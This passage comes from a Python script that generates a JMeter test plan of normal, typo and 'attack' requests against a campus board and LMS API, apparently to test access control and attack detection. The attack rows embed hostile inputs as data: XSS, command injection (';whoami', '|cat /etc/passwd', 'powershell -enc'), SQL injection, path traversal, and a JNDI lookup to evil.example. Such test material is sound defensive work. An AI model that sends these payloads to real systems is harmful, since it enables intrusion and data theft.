        ("attack", "lms-student-a-to-admin-enrollments", "GET", "/api/lms/admin/enrollments", "lms_student_a", "403"),
        ("attack", "admin-to-my-courses", "GET", "/api/lms/courses/my", "admin", "403"),
        ("attack", "admin-to-assignment1", "GET", "/api/lms/assignments/1", "admin", "403"),
        ("attack", "lms-student-a-to-assignment3", "GET", "/api/lms/assignments/3", "lms_student_a", "403|404"),
        ("attack", "student-alt-to-assignment3", "GET", "/api/lms/assignments/3", "student_alt", "403|404"),
        ("attack", "student-to-assignment4", "GET", "/api/lms/assignments/4", "student", "403|404"),
        ("attack", "student-to-course6-assignments", "GET", "/api/lms/courses/6/assignments", "student", "403|404"),
        ("attack", "student-alt-to-course5-assignments", "GET", "/api/lms/courses/5/assignments", "student_alt", "403|404"),
        ("attack", "student-assignment-404", "GET", "/api/lms/assignments/999999", "student", "404"),
        ("attack", "prof-assignment-404", "GET", "/api/lms/assignments/999999", "professor", "404"),
        ("attack", "admin-delete-enrollment-404", "DELETE", "/api/lms/admin/enrollments/999999", "admin", "404"),
        ("attack", "prof-grade-missing-404", "POST", "/api/lms/submissions/999999/grade", "professor", "404"),
        ("attack", "student-submit-missing-404", "POST", "/api/lms/assignments/999999/submissions", "student", "404"),
    ]
    for idx, item in enumerate(negative_entries, start=51):
        case_class, intent, method, request_path, auth_scope, accepted_codes = item
        kwargs = {"auth_scope": auth_scope, "accepted_codes": accepted_codes}
        if method == "POST" and "grade" in request_path:
            kwargs["content_type"] = "application/json"
            kwargs["request_body"] = make_grade_body(40, "missing submission")
        elif method == "POST":
            kwargs["content_type"] = "application/json"
            kwargs["request_body"] = make_submit_body("missing assignment")
        add(idx, case_class, intent, method, request_path, **kwargs)

    follow_up_rows = [
        ("ambiguous", "regrade-sub1-select", "POST", "/api/lms/submissions/${lms_sub_1}/grade", "professor", make_grade_body(96, "select 문 예시가 포함된 제출물로 보이며 정상 문맥입니다."), "200|400|403|404"),
        ("ambiguous", "regrade-sub2-script", "POST", "/api/lms/submissions/${lms_sub_2}/grade", "professor", make_grade_body(89, "script 태그 예시 설명용 문맥으로 판단됩니다."), "200|400|403|404"),
        ("ambiguous", "regrade-sub3-traversal", "POST", "/api/lms/submissions/${lms_sub_3}/grade", "professor", make_grade_body(91, "../admin 경로는 분석 예시 맥락으로 확인됩니다."), "200|400|403|404"),
        ("ambiguous", "regrade-sub4-command", "POST", "/api/lms/submissions/${lms_sub_4}/grade", "professor", make_grade_body(87, "cmd.exe 와 powershell -enc 문자열은 보고서 예시입니다."), "200|400|403|404"),
        ("attack", "regrade-sub5-script", "POST", "/api/lms/submissions/${lms_sub_5}/grade", "professor", make_grade_body(65, "<script>alert(1)</script> 를 피드백에 재전송하는 공격성 테스트입니다."), "200|400|403|404"),
        ("normal", "student-read-assignment3", "GET", "/api/lms/assignments/3", "student", "", "200|403|404"),
        ("normal", "student-alt-read-assignment4", "GET", "/api/lms/assignments/4", "student_alt", "", "200|403|404"),
        ("normal", "lms-student-a-read-assignment1", "GET", "/api/lms/assignments/1", "lms_student_a", "", "200|403|404"),
        ("normal", "admin-list-enrollments-tail", "GET", "/api/lms/admin/enrollments", "admin", "", "200|403"),
        ("normal", "admin-overviews-tail", "GET", "/api/lms/admin/students/overviews", "admin", "", "200|403"),
        ("normal", "prof-read-assignment1", "GET", "/api/lms/assignments/1", "professor", "", "200|403|404"),
        ("normal", "prof-read-assignment5", "GET", "/api/lms/assignments/5", "professor", "", "200|403|404"),
        ("normal", "student-tail-courses", "GET", "/api/lms/courses/my", "student", "", "200"),
        ("normal", "student-alt-tail-courses", "GET", "/api/lms/courses/my", "student_alt", "", "200"),
        ("normal", "lms-student-a-tail-courses", "GET", "/api/lms/courses/my", "lms_student_a", "", "200"),
        ("normal", "admin-create-enrollment-course1", "POST", "/api/lms/admin/enrollments", "admin", make_enrollment_body(1, "${lms_student_d_id}"), "201|400|403|404"),
        ("normal", "admin-delete-enrollment-course1", "DELETE", "/api/lms/admin/enrollments/${lms_dyn_enroll_3}", "admin", "", "204|403|404"),
        ("attack", "regrade-sub1-command", "POST", "/api/lms/submissions/${lms_sub_1}/grade", "professor", make_grade_body(80, ";whoami"), "200|400|403|404"),
        ("attack", "regrade-sub2-jndi", "POST", "/api/lms/submissions/${lms_sub_2}/grade", "professor", make_grade_body(75, "${jndi:ldap://evil.example/a}"), "200|400|403|404"),
        ("ambiguous", "regrade-sub3-alert", "POST", "/api/lms/submissions/${lms_sub_3}/grade", "professor", make_grade_body(93, "alert tcp 룰 설명 문장입니다."), "200|400|403|404"),
        ("normal", "student-read-assignment2", "GET", "/api/lms/assignments/2", "student", "", "200|403|404"),
        ("normal", "student-alt-read-assignment5", "GET", "/api/lms/assignments/5", "student_alt", "", "200|403|404"),
        ("normal", "admin-users-tail", "GET", "/api/lms/admin/users", "admin", "", "200|403"),
        ("normal", "admin-courses-tail", "GET", "/api/lms/admin/courses", "admin", "", "200|403"),
        ("normal", "admin-enrollments-tail-2", "GET", "/api/lms/admin/enrollments", "admin", "", "200|403"),
        ("normal", "prof-read-assignment2-tail", "GET", "/api/lms/assignments/2", "professor", "", "200|403|404"),
        ("normal", "prof-read-assignment3-tail", "GET", "/api/lms/assignments/3", "professor", "", "200|403|404"),
        ("normal", "student-course1-tail", "GET", "/api/lms/courses/1/assignments", "student", "", "200|403|404"),
        ("normal", "student-alt-course6-tail", "GET", "/api/lms/courses/6/assignments", "student_alt", "", "200|403|404"),
        ("normal", "lms-student-a-read-assignment2", "GET", "/api/lms/assignments/2", "lms_student_a", "", "200|403|404"),
        ("attack", "student-to-overviews", "GET", "/api/lms/admin/students/overviews", "student", "", "403"),
        ("attack", "student-alt-to-users", "GET", "/api/lms/admin/users", "student_alt", "", "403"),
        ("attack", "professor-to-enrollments", "GET", "/api/lms/admin/enrollments", "professor", "", "403"),
        ("attack", "lms-student-a-to-course2", "GET", "/api/lms/courses/2/assignments", "lms_student_a", "", "403|404"),
        ("attack", "admin-to-my-courses-tail", "GET", "/api/lms/courses/my", "admin", "", "403"),
    ]
    for idx, entry in enumerate(follow_up_rows, start=66):
        case_class, intent, method, request_path, auth_scope, body, accepted_codes = entry
        kwargs = {"auth_scope": auth_scope, "accepted_codes": accepted_codes}
        if idx == 81:
            kwargs["capture_var"] = "lms_dyn_enroll_3"
            kwargs["capture_expr"] = "id"
        if method == "POST":
            kwargs["content_type"] = "application/json"
            kwargs["request_body"] = body
        add(idx, case_class, intent, method, request_path, **kwargs)

    assert len(rows) == 100
    return rows


def secure_route_rows() -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    normal_paths = [
        ("student", "/api/auth/me"),
        ("student", path("/api/board/posts", keyword="wifi", sort="latest", page=0, size=5)),
        ("student", "/api/board/posts/1"),
        ("student", "/api/board/posts/2"),
        ("student_alt", path("/api/board/posts", keyword="도서관", sort="title", page=0, size=6)),
        ("student_alt", "/api/board/posts/1"),
        ("admin", "/api/lms/admin/users"),
        ("admin", "/api/lms/admin/courses"),
        ("admin", "/api/lms/admin/enrollments"),
        ("admin", "/api/lms/admin/students/overviews"),
        ("professor", "/api/lms/assignments/1"),
        ("professor", "/api/lms/assignments/4"),
        ("student", "/api/lms/courses/my"),
        ("student_alt", "/api/lms/courses/my"),
        ("lms_student_a", "/api/lms/courses/my"),
        ("student", "/api/lms/courses/1/assignments"),
        ("student_alt", "/api/lms/courses/6/assignments"),
        ("lms_student_a", "/api/lms/assignments/1"),
        ("student", path("/api/board/posts", author="student1", sort="latest", page=0, size=5)),
        ("student_alt", path("/api/board/posts", author="김민지", sort="title", page=0, size=6)),
        ("student", path("/api/board/posts", keyword="보안", dateFrom="2026-03-01", dateTo="2026-03-31", sort="latest", page=0, size=5)),
        ("student_alt", path("/api/board/posts", keyword="정상 요청", sort="latest", page=0, size=5)),
        ("admin", "/api/lms/admin/users"),
        ("admin", "/api/lms/admin/courses"),
        ("professor", "/api/lms/assignments/5"),
        ("student", "/api/auth/me"),
        ("student_alt", "/api/auth/me"),
        ("student", "/api/board/posts/999999"),
        ("student_alt", "/api/board/posts/999999"),
        ("lms_student_a", "/api/lms/assignments/2"),
    ]
    for idx, (auth_scope, request_path) in enumerate(normal_paths, start=1):
        rows.append(row(f"route_{idx:03d}", "normal", "secure-route-normal", "GET", request_path, auth_scope=auth_scope, accepted_codes="200|401|403|404"))

    typo_paths = [
        ("student", "/api/board/posst"), ("student", "/api/board/posts/"), ("student", "/api//board/posts"), ("student", "/API/board/posts"), ("student", "/api/Board/posts"), ("student", "/api/board/Posts"), ("student", "/api/board/posts.json"), ("student", "/api/board/posts;"), ("student", "/api/board/posts..%2f"), ("student", path("/api/board/posts", keywrod="wifi", sort="latest", size=5)), ("student", path("/api/board/posts", keyword="select 문 정리", sort="latset", size=5)), ("student", path("/api/board/posts", keyword="script 태그 설명", sort="latest", siize=5)), ("student_alt", "/api/auth/mee"), ("student_alt", "/api/auth/me/"), ("student_alt", "/api//auth/me"), ("student_alt", "/API/auth/me"), ("admin", "/api/lms/course/my"), ("admin", "/api/lms/courses//my"), ("admin", "/api/lms/admin/course"), ("admin", "/api/lms/admin/enrollment"), ("admin", "/api/lms/admin/users/"), ("admin", "/api/lms/admin/students/overview"), ("professor", "/api/lms/assignment/1"), ("professor", "/api/lms/assignments/1/"), ("professor", "/api//lms/assignments/1"), ("professor", "/API/lms/assignments/1"), ("professor", "/api/lms/Assignments/1"), ("lms_student_a", "/api/lms/assignments/1/"), ("lms_student_a", "/api/lms/assignment/1"), ("lms_student_a", path("/api/lms/courses/1/assignments", detail="select 문 예시")), ("student", "/api/board/posts/%2e/"), ("student_alt", "/api/board/posts/%2e%2e;/"), ("admin", "/api/lms/admin/enrollments/"), ("professor", "/api/lms/submissions/1/grade/"), ("student", "/api/auth/me..%2f"), ("student_alt", "/api/auth/me%20"), ("lms_student_a", "/api/lms/courses/1/assignments/"), ("student", "/api/board/posts//"), ("student_alt", "/api/board/posts/%2e%2e;"), ("admin", "/api/lms/admin//users"), ("professor", "/api//lms/assignments/4"), ("student", "/api/board/posts?keyword=오타&sort=latest&size=5&variant=route"), ("student_alt", "/api/board/posts/?keyword=도서관&sort=latest&size=5"), ("lms_student_a", "/api/lms/courses//1/assignments"), ("admin", "/api/lms/admin/courses/"),
    ]
    for idx, (auth_scope, request_path) in enumerate(typo_paths, start=31):
        rows.append(row(f"route_{idx:03d}", "ambiguous", "secure-route-typo", "GET", request_path, auth_scope=auth_scope, accepted_codes="200|400|401|403|404"))

    attack_paths = [
        ("student", path("/api/board/posts", keyword="../admin", sort="latest", page=0, size=5)), ("student", path("/api/board/posts", keyword="<script>alert(1)</script>", sort="latest", page=0, size=5)), ("student", path("/api/board/posts", keyword=";whoami", sort="latest", page=0, size=5)), ("student", path("/api/board/posts", keyword="${jndi:ldap://evil.example/a}", sort="latest", page=0, size=5)), ("student", path("/api/board/posts", keyword="union select password from users--", sort="latest", page=0, size=5)), ("student", "/api/board/posts/%2e%2e;/"), ("student_alt", "/api/board/posts/..;/"), ("student_alt", path("/api/board/posts", keyword="cmd.exe /c whoami", sort="latest", page=0, size=5)), ("student_alt", path("/api/board/posts", keyword="powershell -enc ZQB2AGkAbAA=", sort="latest", page=0, size=5)), ("student_alt", path("/api/board/posts", keyword="|cat /etc/passwd", sort="latest", page=0, size=5)), ("admin", path("/api/lms/courses/1/assignments", note="<script>alert(1)</script>")), ("admin", path("/api/lms/courses/1/assignments", note=";whoami")), ("admin", path("/api/lms/courses/1/assignments", note="${jndi:ldap://evil.example/a}")), ("admin", "/api/lms/admin/enrollments/%2e%2e;/"), ("admin", "/api/lms/admin/users..%2f"), ("professor", "/api/lms/assignments/1/..;/"), ("professor", path("/api/lms/assignments/1", note="../admin")), ("professor", path("/api/lms/assignments/1", note="cmd.exe /c whoami")), ("professor", path("/api/lms/assignments/1", note="powershell -enc ZQB2AGkAbAA=")), ("professor", path("/api/lms/assignments/1", note="waitfor delay '0:0:5'--")), ("lms_student_a", "/api/auth/me..%2e%2e;/"), ("lms_student_a", "/api/lms/courses/1/assignments/%2e/"), ("student", "/api/auth/me%2f..%2f"), ("student_alt", "/api/board/posts/%2e%2e;/"), ("admin", "/api/lms/admin/courses/%2e%2e;/"),
    ]
    for idx, (auth_scope, request_path) in enumerate(attack_paths, start=76):
        rows.append(row(f"route_{idx:03d}", "attack", "secure-route-attack", "GET", request_path, auth_scope=auth_scope, accepted_codes="200|400|401|403|404"))

    assert len(rows) == 100
    return rows


def generic_capture_script() -> str:
    return dedent(
        """
        import groovy.json.JsonSlurper

        def code = prev.getResponseCode()
        def accepted = (vars.get('accepted_codes') ?: '')
                .split(/\\|/)
                .collect { it?.trim() }
                .findAll { it }
        if (code && accepted.contains(code)) {
            prev.setSuccessful(true)
            prev.setResponseMessage('Accepted mixed status: ' + code)
        }

        def captureVar = vars.get('capture_var')
        def captureExpr = vars.get('capture_expr')
        if (!captureVar || !captureExpr) {
            return
        }
        def raw = prev.getResponseDataAsString()
        if (!raw) {
            return
        }

        def parsed
        try {
            parsed = new JsonSlurper().parseText(raw)
        } catch (Exception ignored) {
            return
        }

        def current = parsed
        for (part in captureExpr.split(/\\./)) {
            if (current == null) {
                return
            }
            if (current instanceof List) {
                if (!part.isInteger()) {
                    return
                }
                int index = Integer.parseInt(part)
                if (index < 0 || index >= current.size()) {
                    return
                }
                current = current[index]
            } else if (current instanceof Map) {
                current = current[part]
            } else {
                return
            }
        }

        if (current != null) {
            vars.put(captureVar, current.toString())
        }
        """
    ).strip()


def auth_token_expr() -> str:
    return "${__V(${auth_scope}_access_token)}"


def header_manager_xml(with_auth: bool) -> str:
    headers = [
        ("Accept", "application/json, text/plain, */*"),
        ("Content-Type", "${content_type}"),
        ("X-MIX-Case-ID", "${case_id}"),
        ("X-MIX-Case-Class", "${case_class}"),
        ("X-MIX-Intent", "${request_intent}"),
        ("X-Request-ID", "${__UUID()}"),
    ]
    if with_auth:
        headers.insert(2, ("Authorization", f"Bearer {auth_token_expr()}"))

    blocks = []
    for name, value in headers:
        blocks.append(
            f"""
                <elementProp name="{xml_escape(name)}" elementType="Header">
                  <stringProp name="Header.name">{xml_escape(name)}</stringProp>
                  <stringProp name="Header.value">{xml_escape(value)}</stringProp>
                </elementProp>"""
        )
    return (
        '            <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="HTTP Headers" enabled="true">\n'
        '              <collectionProp name="HeaderManager.headers">\n'
        + "".join(blocks)
        + "\n              </collectionProp>\n"
        "            </HeaderManager>\n"
        "            <hashTree />\n"
    )


def generic_sampler_xml(label: str, with_auth: bool) -> str:
    return f"""
          <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="{xml_escape(label)}" enabled="true">
            <stringProp name="HTTPSampler.path">${{request_path}}</stringProp>
            <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
            <stringProp name="HTTPSampler.method">${{http_method}}</stringProp>
            <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
            <boolProp name="HTTPSampler.postBodyRaw">true</boolProp>
            <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
              <collectionProp name="Arguments.arguments">
                <elementProp name="" elementType="HTTPArgument">
                  <boolProp name="HTTPArgument.always_encode">false</boolProp>
                  <stringProp name="Argument.value">${{request_body}}</stringProp>
                  <stringProp name="Argument.metadata">=</stringProp>
                </elementProp>
              </collectionProp>
            </elementProp>
            <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
          </HTTPSamplerProxy>
          <hashTree>
{header_manager_xml(with_auth)}            <JSR223PostProcessor guiclass="TestBeanGUI" testclass="JSR223PostProcessor" testname="Capture And Accept Status" enabled="true">
              <stringProp name="cacheKey">mixed-capture-accept</stringProp>
              <stringProp name="filename"></stringProp>
              <stringProp name="parameters"></stringProp>
              <stringProp name="scriptLanguage">groovy</stringProp>
              <stringProp name="script">{xml_escape(generic_capture_script())}</stringProp>
            </JSR223PostProcessor>
            <hashTree />
          </hashTree>
"""


def generic_thread_group_xml(testname: str, csv_prop: str, csv_default: str, loops_prop: str, delay_prop: str, delay_default: int, random_prop: str, random_default: int, comments: str, label: str) -> str:
    auth_if = xml_escape("${__groovy((vars.get('auth_scope') ?: 'none') != 'none')}")
    no_auth_if = xml_escape("${__groovy((vars.get('auth_scope') ?: 'none') == 'none')}")
    return f"""
      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="{xml_escape(testname)}" enabled="true">
        <stringProp name="TestPlan.comments">{xml_escape(comments)}</stringProp>
        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="Thread Group Loop Controller" enabled="true">
          <stringProp name="LoopController.loops">1</stringProp>
          <boolProp name="LoopController.continue_forever">false</boolProp>
        </elementProp>
        <stringProp name="ThreadGroup.num_threads">1</stringProp>
        <stringProp name="ThreadGroup.ramp_time">1</stringProp>
        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
        <boolProp name="ThreadGroup.scheduler">false</boolProp>
        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
      </ThreadGroup>
      <hashTree>
        <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults" enabled="true">
          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
            <collectionProp name="Arguments.arguments" />
          </elementProp>
          <stringProp name="HTTPSampler.domain">${{__P(host,www.kj.ac.kr)}}</stringProp>
          <stringProp name="HTTPSampler.port">${{__P(port,80)}}</stringProp>
          <stringProp name="HTTPSampler.protocol">${{__P(protocol,http)}}</stringProp>
          <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
        </ConfigTestElement>
        <hashTree />
        <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager" enabled="true">
          <collectionProp name="CookieManager.cookies" />
          <boolProp name="CookieManager.clearEachIteration">false</boolProp>
          <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
        </CookieManager>
        <hashTree />
        <LoopController guiclass="LoopControlPanel" testclass="LoopController" testname="{xml_escape(label)} Loop Controller" enabled="true">
          <stringProp name="LoopController.loops">${{__P({loops_prop},100)}}</stringProp>
          <boolProp name="LoopController.continue_forever">false</boolProp>
        </LoopController>
        <hashTree>
          <CSVDataSet guiclass="TestBeanGUI" testclass="CSVDataSet" testname="{xml_escape(label)} CSV Data Set" enabled="true">
            <stringProp name="delimiter">,</stringProp>
            <stringProp name="fileEncoding">UTF-8</stringProp>
            <stringProp name="filename">${{__P({csv_prop},{csv_default})}}</stringProp>
            <boolProp name="ignoreFirstLine">true</boolProp>
            <boolProp name="quotedData">true</boolProp>
            <boolProp name="recycle">false</boolProp>
            <stringProp name="shareMode">shareMode.currentThread</stringProp>
            <boolProp name="stopThread">true</boolProp>
            <stringProp name="variableNames">{",".join(CSV_COLUMNS)}</stringProp>
          </CSVDataSet>
          <hashTree />
          <UniformRandomTimer guiclass="UniformRandomTimerGui" testclass="UniformRandomTimer" testname="{xml_escape(label)} Random Timer" enabled="true">
            <stringProp name="RandomTimer.range">${{__P({random_prop},{random_default})}}</stringProp>
            <stringProp name="ConstantTimer.delay">${{__P({delay_prop},{delay_default})}}</stringProp>
          </UniformRandomTimer>
          <hashTree />
          <IfController guiclass="IfControllerPanel" testclass="IfController" testname="{xml_escape(label)} Requires Auth" enabled="true">
            <stringProp name="IfController.condition">{auth_if}</stringProp>
            <boolProp name="IfController.evaluateAll">true</boolProp>
            <boolProp name="IfController.useExpression">true</boolProp>
          </IfController>
          <hashTree>
{generic_sampler_xml(label + " Auth Case", True)}          </hashTree>
          <IfController guiclass="IfControllerPanel" testclass="IfController" testname="{xml_escape(label)} No Auth" enabled="true">
            <stringProp name="IfController.condition">{no_auth_if}</stringProp>
            <boolProp name="IfController.evaluateAll">true</boolProp>
            <boolProp name="IfController.useExpression">true</boolProp>
          </IfController>
          <hashTree>
{generic_sampler_xml(label + " NoAuth Case", False)}          </hashTree>
        </hashTree>
      </hashTree>
"""


def setup_login_sampler(testname: str, email: str, token_var: str) -> str:
    body = body_json({"email": email, "password": "Password123!"})
    return f"""
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="{xml_escape(testname)}" enabled="true">
          <stringProp name="HTTPSampler.path">/api/auth/login</stringProp>
          <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
          <stringProp name="HTTPSampler.method">POST</stringProp>
          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
          <boolProp name="HTTPSampler.postBodyRaw">true</boolProp>
          <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
            <collectionProp name="Arguments.arguments">
              <elementProp name="" elementType="HTTPArgument">
                <boolProp name="HTTPArgument.always_encode">false</boolProp>
                <stringProp name="Argument.value">{xml_escape(body)}</stringProp>
                <stringProp name="Argument.metadata">=</stringProp>
              </elementProp>
            </collectionProp>
          </elementProp>
          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
        </HTTPSamplerProxy>
        <hashTree>
{header_manager_xml(False)}          <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract {xml_escape(token_var)}" enabled="true">
            <stringProp name="JSONPostProcessor.referenceNames">{xml_escape(token_var)}</stringProp>
            <stringProp name="JSONPostProcessor.jsonPathExprs">$.accessToken</stringProp>
            <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
            <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
          </JSONPostProcessor>
          <hashTree />
        </hashTree>
"""


def setup_register_sampler(testname: str, email_expr: str, name: str, id_var: str) -> str:
    body = body_json({"email": email_expr, "password": "Password123!", "name": name, "role": "STUDENT"})
    return f"""
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="{xml_escape(testname)}" enabled="true">
          <stringProp name="HTTPSampler.path">/api/auth/register</stringProp>
          <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
          <stringProp name="HTTPSampler.method">POST</stringProp>
          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
          <boolProp name="HTTPSampler.postBodyRaw">true</boolProp>
          <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
            <collectionProp name="Arguments.arguments">
              <elementProp name="" elementType="HTTPArgument">
                <boolProp name="HTTPArgument.always_encode">false</boolProp>
                <stringProp name="Argument.value">{xml_escape(body)}</stringProp>
                <stringProp name="Argument.metadata">=</stringProp>
              </elementProp>
            </collectionProp>
          </elementProp>
          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
        </HTTPSamplerProxy>
        <hashTree>
{header_manager_xml(False)}          <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract {xml_escape(id_var)}" enabled="true">
            <stringProp name="JSONPostProcessor.referenceNames">{xml_escape(id_var)}</stringProp>
            <stringProp name="JSONPostProcessor.jsonPathExprs">$.id</stringProp>
            <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
            <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
          </JSONPostProcessor>
          <hashTree />
        </hashTree>
"""


def setup_enroll_sampler(testname: str, course_id: int, student_id_var: str, enrollment_id_var: str) -> str:
    body = make_enrollment_body(course_id, "${" + student_id_var + "}")
    xml = f"""
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="{xml_escape(testname)}" enabled="true">
          <stringProp name="HTTPSampler.path">/api/lms/admin/enrollments</stringProp>
          <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
          <stringProp name="HTTPSampler.method">POST</stringProp>
          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
          <boolProp name="HTTPSampler.postBodyRaw">true</boolProp>
          <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
            <collectionProp name="Arguments.arguments">
              <elementProp name="" elementType="HTTPArgument">
                <boolProp name="HTTPArgument.always_encode">false</boolProp>
                <stringProp name="Argument.value">{xml_escape(body)}</stringProp>
                <stringProp name="Argument.metadata">=</stringProp>
              </elementProp>
            </collectionProp>
          </elementProp>
          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
        </HTTPSamplerProxy>
        <hashTree>
{header_manager_xml(True)}          <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract {xml_escape(enrollment_id_var)}" enabled="true">
            <stringProp name="JSONPostProcessor.referenceNames">{xml_escape(enrollment_id_var)}</stringProp>
            <stringProp name="JSONPostProcessor.jsonPathExprs">$.id</stringProp>
            <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
            <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
          </JSONPostProcessor>
          <hashTree />
        </hashTree>
"""
    return xml.replace(f"Bearer {auth_token_expr()}", "Bearer ${admin_access_token}")


def setup_group_xml() -> str:
    init_script = dedent(
        """
        if (!props.get('mixed500_run_id')) {
            props.put('mixed500_run_id', new Date().format('yyyyMMddHHmmssSSS'))
        }
        vars.put('mixed500_run_id', props.get('mixed500_run_id'))
        """
    ).strip()
    return f"""
      <SetupThreadGroup guiclass="SetupThreadGroupGui" testclass="SetupThreadGroup" testname="Mixed 500 Setup" enabled="true">
        <stringProp name="TestPlan.comments">Bootstrap tokens and temporary LMS users for the 500 main requests.</stringProp>
        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="Thread Group Loop Controller" enabled="true">
          <stringProp name="LoopController.loops">1</stringProp>
          <boolProp name="LoopController.continue_forever">false</boolProp>
        </elementProp>
        <stringProp name="ThreadGroup.num_threads">1</stringProp>
        <stringProp name="ThreadGroup.ramp_time">1</stringProp>
        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
        <boolProp name="ThreadGroup.scheduler">false</boolProp>
        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
      </SetupThreadGroup>
      <hashTree>
        <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults" enabled="true">
          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
            <collectionProp name="Arguments.arguments" />
          </elementProp>
          <stringProp name="HTTPSampler.domain">${{__P(host,www.kj.ac.kr)}}</stringProp>
          <stringProp name="HTTPSampler.port">${{__P(port,80)}}</stringProp>
          <stringProp name="HTTPSampler.protocol">${{__P(protocol,http)}}</stringProp>
          <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
        </ConfigTestElement>
        <hashTree />
        <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager" enabled="true">
          <collectionProp name="CookieManager.cookies" />
          <boolProp name="CookieManager.clearEachIteration">false</boolProp>
          <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
        </CookieManager>
        <hashTree />
        <JSR223Sampler guiclass="TestBeanGUI" testclass="JSR223Sampler" testname="Init Mixed Run Id" enabled="true">
          <stringProp name="cacheKey">init-mixed500-run-id</stringProp>
          <stringProp name="scriptLanguage">groovy</stringProp>
          <stringProp name="script">{xml_escape(init_script)}</stringProp>
        </JSR223Sampler>
        <hashTree />
{setup_login_sampler("Login Student11", "student11@campus.local", "student_access_token")}
{setup_login_sampler("Login Student12", "student12@campus.local", "student_alt_access_token")}
{setup_login_sampler("Login Professor", "prof1@campus.local", "professor_access_token")}
{setup_login_sampler("Login Admin", "admin1@campus.local", "admin_access_token")}
{setup_register_sampler("Register LMS Student A", f"jmx-lms-a-{RUN_ID_EXPR}@campus.local", "lms-a", "lms_student_a_id")}
{setup_login_sampler("Login LMS Student A", f"jmx-lms-a-{RUN_ID_EXPR}@campus.local", "lms_student_a_access_token")}
{setup_enroll_sampler("Enroll LMS Student A To Course 1", 1, "lms_student_a_id", "lms_student_a_enrollment_id")}
{setup_register_sampler("Register LMS Student B", f"jmx-lms-b-{RUN_ID_EXPR}@campus.local", "lms-b", "lms_student_b_id")}
{setup_login_sampler("Login LMS Student B", f"jmx-lms-b-{RUN_ID_EXPR}@campus.local", "lms_student_b_access_token")}
{setup_enroll_sampler("Enroll LMS Student B To Course 5", 5, "lms_student_b_id", "lms_student_b_enrollment_id")}
{setup_register_sampler("Register LMS Student C", f"jmx-lms-c-{RUN_ID_EXPR}@campus.local", "lms-c", "lms_student_c_id")}
{setup_login_sampler("Login LMS Student C", f"jmx-lms-c-{RUN_ID_EXPR}@campus.local", "lms_student_c_access_token")}
{setup_enroll_sampler("Enroll LMS Student C To Course 6", 6, "lms_student_c_id", "lms_student_c_enrollment_id")}
{setup_register_sampler("Register LMS Student D", f"jmx-lms-d-{RUN_ID_EXPR}@campus.local", "lms-d", "lms_student_d_id")}
      </hashTree>
"""


def build_jmx() -> str:
    comments = "Main traffic dataset contains 500 CSV-driven requests across public, auth, board, LMS, and authenticated route typo flows. Union-select style requests are intentionally kept minimal to avoid recurring socket timeout noise."
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
  <hashTree>
    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="FULLSITE_MIXED_500" enabled="true">
      <stringProp name="TestPlan.comments">{xml_escape(comments)}</stringProp>
      <boolProp name="TestPlan.functional_mode">false</boolProp>
      <boolProp name="TestPlan.serialize_threadgroups">false</boolProp>
